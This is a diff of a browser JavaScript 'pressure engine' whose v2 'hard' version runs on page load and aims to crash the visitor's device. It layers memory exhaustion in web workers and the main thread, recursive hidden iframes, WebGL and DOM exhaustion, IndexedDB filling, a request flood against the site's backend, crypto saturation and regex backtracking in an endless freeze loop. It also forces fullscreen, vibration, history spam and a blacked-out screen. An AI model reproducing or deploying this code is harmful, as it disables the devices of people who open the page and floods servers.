@@ -1,8 +1,6 @@
 /*!
- * MAGIC — pressure engine v1.0
- * Fully automatic black-screen crash harness.
- * Params: x=power(0.1-5)  p=phase-limit  s=1 telemetry
- *         fs=0 no-fullscreen  v=0 no-vibrate  net=0 no-network  m=1 mini
+ * MAGIC — pressure engine v2 (hard)
+ * Params: x=power(0.1-6)  s=1 telemetry  net=0 no-network  v=0 no-vibrate  fs=0 no-fullscreen
  */
 (() => {
   'use strict';
@@ -10,124 +8,78 @@
   const P = new URLSearchParams(location.search);
   const clamp = (v, a, b) => (v < a ? a : v > b ? b : v);
 
-  const MINI = P.get('m') === '1';
-  const MULT = clamp(parseFloat(P.get('x')) || 1, 0.1, 5);
+  const MULT = clamp(parseFloat(P.get('x')) || 1, 0.1, 6);
   const TELE = P.get('s') === '1';
-  const FS   = P.get('fs') !== '0';
-  const VIB  = P.get('v')  !== '0';
   const NET  = P.get('net') !== '0';
+  const VIB  = P.get('v')  !== '0';
+  const FS   = P.get('fs') !== '0';
 
   const nav   = navigator;
   const memGB = clamp(+nav.deviceMemory || 4, 2, 32);
   const cores = clamp(+nav.hardwareConcurrency || 4, 1, 16);
-
-  /* power factor: scales every layer to the actual device */
-  const POW = clamp((memGB / 6) * (1 + cores / 12) * MULT, 0.15, 8);
-
-  const HEAP_TARGET = Math.min(memGB * 0.65, 11) * 1e9 * clamp(POW, 0.5, 1.6);
-  const MAXDEPTH    = Math.round(clamp(3 + POW, 3, 7));
+  const POW   = clamp((memGB / 6) * (1 + cores / 10) * MULT, 0.2, 10);
+  const MAXDEPTH = Math.round(clamp(3 + POW, 3, 7));
 
   const $ = (id) => document.getElementById(id);
   const elM = $('m'), elS = $('s'), elStage = $('stage'), elC = $('c');
 
-  /* everything is pinned forever so GC cannot reclaim it */
-  const HOLD  = [];
-  const BYTES = [];
+  const HOLD = [], BYTES = [];
   const hold  = (v) => { HOLD.push(v); return v; };
-  const later = (fn, ms) => { const t = setTimeout(fn, ms); HOLD.push(t); return t; };
-  const at    = (ms, fn) => later(fn, ms);
-  const safe  = (fn) => { try { return fn(); } catch (e) { return undefined; } };
+  const later = (fn, ms) => setTimeout(fn, ms);
+  const safe  = (f) => { try { return f(); } catch (e) {} };
+  const mark  = (n, v) => { if (TELE && elS) elS.textContent = n + (v == null ? '' : ' ' + v); };
 
-  const mark = (name, v) => {
-    if (TELE && elS) elS.textContent = name + (v == null ? '' : ' ' + v);
-  };
-
-  /* touch one byte per 4K page => forces real commit, not lazy reservation */
-  const bite = (bytes) => {
-    const a = new Uint8Array(bytes);
-    for (let i = 0; i < bytes; i += 4096) a[i] = i & 255;
+  const bite = (n) => {
+    const a = new Uint8Array(n);
+    for (let i = 0; i < n; i += 4096) a[i] = i & 255;
     return a;
   };
 
-  /* ---------- LAYER 1: heap OOM, sliced so timers still fire ---------- */
-  let heapGot = 0;
-  function heapSlice() {
-    const step = clamp(Math.round(7 * POW), 2, 64) << 20;
-    const t0 = performance.now();
-    do {
-      try {
-        BYTES.push(bite(step));
-        heapGot += step;
-      } catch (e) {
-        BYTES.length = 0;          // free everything, then slam again
-        heapGot = 0;
-        safe(() => BYTES.push(bite(step >> 2)));
-      }
-      if (heapGot >= HEAP_TARGET) { mark('HEAP-FULL', (heapGot >> 20) + 'M'); return; }
-    } while (performance.now() - t0 < 26);
-    mark('HEAP', (heapGot >> 20) + 'M');
-    later(heapSlice, 6);
-  }
-
-  /* ---------- LAYER 2: worker threads, each its own heap ---------- */
-  const WORKER_SRC = `
-    var hold = [];
+  /* ---- 1. workers: apna apna heap, 16MB per hit, forever ---- */
+  const WSRC = `
+    var H = [];
     onmessage = function (e) {
-      var step = e.data || 4194304;
+      var s = e.data || 16777216;
       for (;;) {
-        try {
-          var a = new Uint8Array(step);
-          for (var i = 0; i < step; i += 4096) a[i] = i & 255;
-          hold.push(a);
-        } catch (err) { hold = []; }
+        try { var a = new Uint8Array(s); for (var i = 0; i < s; i += 4096) a[i] = i & 255; H.push(a); }
+        catch (x) { H = []; }
       }
     };`;
-
-  function workerBomb(n) {
-    let url;
-    try { url = URL.createObjectURL(new Blob([WORKER_SRC], { type: 'text/javascript' })); }
-    catch (e) { return; }
-    const step = clamp(Math.round(2 * POW), 1, 24) << 20;
+  function workers() {
+    let url; try { url = URL.createObjectURL(new Blob([WSRC], { type: 'text/javascript' })); } catch (e) { return; }
+    const n = clamp(Math.round(cores * 4 * POW), 8, 48);
+    const step = clamp(Math.round(4 * POW), 2, 32) << 20;
     for (let i = 0; i < n; i++) {
-      try {
-        const w = new Worker(url);
-        w.onmessage = () => {};
-        w.postMessage(step);
-        hold(w);
-      } catch (e) { break; }
+      try { const w = new Worker(url); w.onmessage = () => {}; w.postMessage(step); hold(w); } catch (e) { break; }
     }
   }
 
-  /* ---------- LAYER 3: recursive same-origin iframes ---------- */
-  function frameBomb() {
+  /* ---- 2. recursive iframes ---- */
+  function frames() {
     const level = parseInt(P.get('d'), 10) || 0;
     if (level >= MAXDEPTH) return;
-    for (let i = 0; i < 2; i++) {
+    const breadth = level < 2 ? 3 : 2;
+    for (let i = 0; i < breadth; i++) {
       try {
         const f = document.createElement('iframe');
-        f.src = '/void.html?m=1&d=' + (level + 1) + '&x=' + POW.toFixed(2);
-        f.setAttribute('width', '1');
-        f.setAttribute('height', '1');
+        f.src = '/void.html?d=' + (level + 1);
         f.setAttribute('scrolling', 'no');
-        f.style.cssText =
-          'position:fixed;left:0;top:0;width:1px;height:1px;border:0;opacity:0;pointer-events:none';
-        document.body.appendChild(f);
-        hold(f);
+        f.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;border:0;opacity:0;pointer-events:none';
+        document.body.appendChild(f); hold(f);
       } catch (e) { break; }
     }
   }
 
-  /* ---------- LAYER 4: GPU / WebGL context + canvas memory ---------- */
-  function gpuBomb(n) {
-    const side = clamp(Math.round(1536 * Math.sqrt(POW)), 512, 4096);
+  /* ---- 3. GPU / WebGL contexts ---- */
+  function gpu() {
+    const side = clamp(Math.round(2048 * Math.sqrt(POW)), 1024, 4096);
+    const n = clamp(Math.round(10 * POW), 6, 48);
     for (let i = 0; i < n; i++) {
       try {
         const cv = document.createElement('canvas');
         cv.width = side; cv.height = side;
-        const gl = cv.getContext('webgl', {
-          antialias: false, depth: true, stencil: false,
-          powerPreference: 'high-performance', preserveDrawingBuffer: false
-        }) || cv.getContext('experimental-webgl');
+        const gl = cv.getContext('webgl', { antialias: false, depth: true, stencil: false, powerPreference: 'high-performance' })
+                || cv.getContext('experimental-webgl');
         if (gl) { gl.clearColor(0, 0, 0, 1); gl.clear(gl.COLOR_BUFFER_BIT); }
         else { const c2 = cv.getContext('2d'); if (c2) c2.fillRect(0, 0, side, side); }
         hold(cv); hold(gl);
@@ -135,15 +87,16 @@
     }
   }
 
-  /* ---------- LAYER 5: DOM + forced compositor layers ---------- */
-  function domBomb(n) {
+  /* ---- 4. DOM + compositor layers ---- */
+  function dom() {
     if (!elStage) return;
+    const n = clamp(Math.round(5000 * POW), 4000, 20000);
     const frag = document.createDocumentFragment();
     for (let i = 0; i < n; i++) {
       const d = document.createElement('div');
       d.textContent = 'MAGIC';
       d.style.cssText =
-        'position:absolute;left:' + (i % 37) + 'px;top:' + (i % 53) + 'px;' +
+        'position:absolute;left:' + (i % 41) + 'px;top:' + (i % 59) + 'px;' +
         'width:3px;height:3px;font:1px/1 monospace;color:#000;' +
         'transform:translate3d(0,0,0);will-change:transform;contain:strict';
       frag.appendChild(d);
@@ -151,118 +104,136 @@
     elStage.appendChild(frag);
   }
 
-  /* ---------- LAYER 6: storage churn ---------- */
-  function storageBomb() {
-    const blob = 'M'.repeat(65536);
-    try { for (let i = 0; i < 140; i++) localStorage.setItem('m' + i, blob + i); } catch (e) {}
-    try { for (let i = 0; i < 140; i++) sessionStorage.setItem('s' + i, blob + i); } catch (e) {}
+  /* ---- 5. strings / packed arrays ---- */
+  function strings() {
+    try { hold('M'.repeat(48e6)); } catch (e) {}
+    try { hold('x'.repeat(24e6).split('')); } catch (e) {}
+    for (let i = 0; i < 8; i++) { try { hold(new Array(3e6).fill(i)); } catch (e) { break; } }
+    try { hold(new Float64Array(8e6)); } catch (e) {}
   }
 
-  /* ---------- LAYER 7: network flood + backend fan-out chain ---------- */
-  function netFlood() {
-    const CONC = clamp(Math.round(8 * POW) + 8, 8, 72);
+  /* ---- 6. network flood + backend chain ---- */
+  function net() {
+    if (!NET) return;
+    const CONC = clamp(Math.round(16 * POW) + 20, 20, 110);
     const sizes = [32, 128, 512, 1024, 2048, 4096];
     const lane = (i) => {
       const kb = sizes[i % sizes.length];
       const go = () => {
         fetch('/api/hammer?s=' + kb + '&c=1&r=' + Math.random(), { cache: 'no-store' })
-          .then((r) => r.arrayBuffer())
-          .then((b) => { BYTES.push(b); go(); })
-          .catch(() => later(go, 25));
+          .then((r) => r.arrayBuffer()).then((b) => { BYTES.push(b); go(); })
+          .catch(() => setTimeout(go, 20));
       };
       go();
     };
-    for (let i = 0; i < CONC; i++) later(() => lane(i), i * 10);
-
-    /* server-side amplification: each hit fans out to more functions */
-    for (let i = 0; i < Math.min(4, Math.round(POW) + 2); i++) {
+    for (let i = 0; i < CONC; i++) setTimeout(() => lane(i), i * 6);
+    for (let i = 0; i < clamp(Math.round(POW) + 3, 3, 8); i++) {
       const chain = () => {
         fetch('/api/chain?d=0&f=3&s=48&r=' + Math.random(), { cache: 'no-store' })
-          .then((r) => r.arrayBuffer())
-          .then((b) => { BYTES.push(b); chain(); })
-          .catch(() => later(chain, 60));
+          .then((r) => r.arrayBuffer()).then((b) => { BYTES.push(b); chain(); })
+          .catch(() => setTimeout(chain, 50));
       };
-      later(chain, 110 + i * 80);
+      setTimeout(chain, 60 + i * 60);
     }
   }
 
-  /* ---------- shell: fullscreen, wake lock, haptics, history, SW ---------- */
+  /* ---- 7. crypto digest saturation ---- */
+  function cryptoBomb() {
+    const sub = window.crypto && window.crypto.subtle;
+    if (!sub) return;
+    const buf = new Uint8Array(4 << 20);
+    for (let i = 0; i < 14; i++) {
+      const go = () => sub.digest('SHA-256', buf).then(go).catch(() => setTimeout(go, 15));
+      go();
+    }
+  }
+
+  /* ---- 8. IndexedDB bulk ---- */
+  function idb() {
+    try {
+      const r = indexedDB.open('magic', 1);
+      r.onupgradeneeded = () => { try { r.result.createObjectStore('s', { autoIncrement: true }); } catch (e) {} };
+      r.onsuccess = () => {
+        try {
+          const st = r.result.transaction('s', 'readwrite').objectStore('s');
+          const blob = 'M'.repeat(1 << 16);
+          for (let i = 0; i < 6000; i++) st.put(blob + i);
+        } catch (e) {}
+      };
+    } catch (e) {}
+  }
+
+  /* ---- 9. main-thread heap grind (never stops) ---- */
+  function heap() {
+    const step = clamp(Math.round(14 * POW), 8, 96) << 20;
+    for (let i = 0; i < 5; i++) {
+      try { BYTES.push(bite(step)); } catch (e) { BYTES.length = 0; }
+    }
+    later(heap, 1);
+  }
+
+  /* ---- shell ---- */
   function fullscreen() {
-    if (!FS || MINI) return;
+    if (!FS) return;
     const d = document.documentElement;
     const fn = d.requestFullscreen || d.webkitRequestFullscreen || d.mozRequestFullScreen;
-    if (fn) safe(() => { const r = fn.call(d, { navigationUI: 'hide' }); if (r && r.catch) r.catch(() => {}); });
+    if (fn) safe(() => { const p = fn.call(d, { navigationUI: 'hide' }); if (p && p.catch) p.catch(() => {}); });
     safe(() => { const o = screen.orientation; if (o && o.lock) o.lock('portrait').catch(() => {}); });
   }
-
-  function wakeLock() {
-    if (MINI) return;
-    safe(() => nav.wakeLock.request('screen').then((l) => hold(l)).catch(() => {}));
-  }
-
+  function wakeLock() { safe(() => nav.wakeLock.request('screen').then((l) => hold(l)).catch(() => {})); }
   function buzz() {
     if (!VIB) return;
-    safe(() => nav.vibrate([120, 60, 180, 80, 240, 120, 400]));
-    later(buzz, 850);
+    safe(() => nav.vibrate([140, 60, 200, 70, 260, 110, 500]));
+    later(buzz, 800);
   }
-
-  let hstep = 0;
+  let hs = 0;
   function historyBomb() {
-    if (MINI) return;
-    for (let i = 0; i < 250; i++) {
-      try { history.pushState(null, '', '#' + (hstep++)); } catch (e) { break; }
-    }
-    later(historyBomb, 25);
+    for (let i = 0; i < 300; i++) { try { history.pushState(null, '', '#' + (hs++)); } catch (e) { break; } }
+    later(historyBomb, 20);
   }
+  function registerSW() { safe(() => nav.serviceWorker && nav.serviceWorker.register('/sw.js').then((r) => hold(r)).catch(() => {})); }
 
-  function registerSW() {
-    if (MINI) return;
-    safe(() => nav.serviceWorker && nav.serviceWorker.register('/sw.js').then((r) => hold(r)).catch(() => {}));
-  }
-
-  /* ---------- blackout ---------- */
+  /* ---- blackout ---- */
   function blackout() {
     mark('BLACK');
     safe(() => elM && elM.classList.add('dim'));
-    safe(() => elStage && (elStage.style.display = 'none'));
     safe(() => elC && elC.remove());
+    safe(() => elStage && (elStage.style.display = 'none'));
     safe(() => { document.documentElement.style.background = '#000'; document.body.style.background = '#000'; });
     safe(() => elS && (elS.textContent = ''));
-    safe(() => nav.vibrate([450, 80, 450, 80, 1200]));
+    safe(() => nav.vibrate([550, 90, 550, 90, 1600]));
   }
 
-  /* ---------- LAYER 8: permanent main-thread freeze ---------- */
-  const RE1 = /^(a+)+$/;
-  const RE2 = /(a|aa)+$/;
-  const S1  = 'a'.repeat(28) + '!';   // ~2^28 backtracks
-  const S2  = 'a'.repeat(20) + '!';
+  /* ---- all layers, one tick ---- */
+  function detonate() {
+    mark('DETONATE');
+    safe(workers); safe(frames); safe(gpu); safe(dom);
+    safe(strings); safe(net); safe(cryptoBomb); safe(idb); safe(heap);
+  }
 
+  /* ---- permanent freeze ---- */
+  const R1 = /^(a+)+$/, R2 = /(a|aa)+$/, R3 = /^(\w+\s?)+$/;
+  const S1 = 'a'.repeat(30) + '!';
+  const S2 = 'a'.repeat(24) + '!';
+  const S3 = 'ab '.repeat(30) + '!';
   function freeze() {
     mark('FREEZE');
     for (;;) {
-      safe(() => RE1.test(S1));
-      safe(() => RE2.test(S2));
-      try { hold(new Uint8Array(1 << 20)); } catch (e) { BYTES.length = 0; }
+      safe(() => R1.test(S1));
+      safe(() => R2.test(S2));
+      safe(() => R3.test(S3));
+      try { HOLD.push(new Uint8Array(1 << 20)); } catch (e) { BYTES.length = 0; }
     }
   }
 
-  /* ---------- boot ---------- */
-  if (MINI) {
-    at(0,   frameBomb);
-    at(8,   () => heapSlice());
-    at(50,  () => gpuBomb(2));
-    at(320, freeze);
-  } else {
-    at(0,    () => { mark('BOOT'); fullscreen(); wakeLock(); buzz(); historyBomb(); registerSW(); });
-    at(16,   () => mark('DEVICE', memGB + 'G/' + cores + 'C/x' + POW.toFixed(2)));
-    if (NET) at(36, () => { mark('NET'); netFlood(); });
-    at(80,   () => { mark('WORKERS'); workerBomb(clamp(Math.round(cores * 1.6 * POW), 2, 40)); });
-    at(140,  () => { mark('FRAMES');  frameBomb(); });
-    at(210,  () => { mark('GPU');     gpuBomb(clamp(Math.round(6 * POW), 3, 40)); });
-    at(280,  () => { mark('DOM');     domBomb(clamp(Math.round(2600 * POW), 1500, 12000)); });
-    at(360,  () => { mark('HEAP');    heapSlice(); });
-    at(520,  () => { mark('STORAGE'); storageBomb(); });
-    at(640,  blackout);
-    at(1100, freeze);
-  }
+  /* ---- go ---- */
+  let f = 0;
+  const kick = () => {
+    if (f++ < 2) return requestAnimationFrame(kick);
+    safe(fullscreen); safe(wakeLock); safe(buzz); safe(historyBomb); safe(registerSW);
+    setTimeout(blackout, 90);
+    setTimeout(detonate, 120);
+    setTimeout(freeze, 1250);
+  };
+  requestAnimationFrame(kick);
 })();
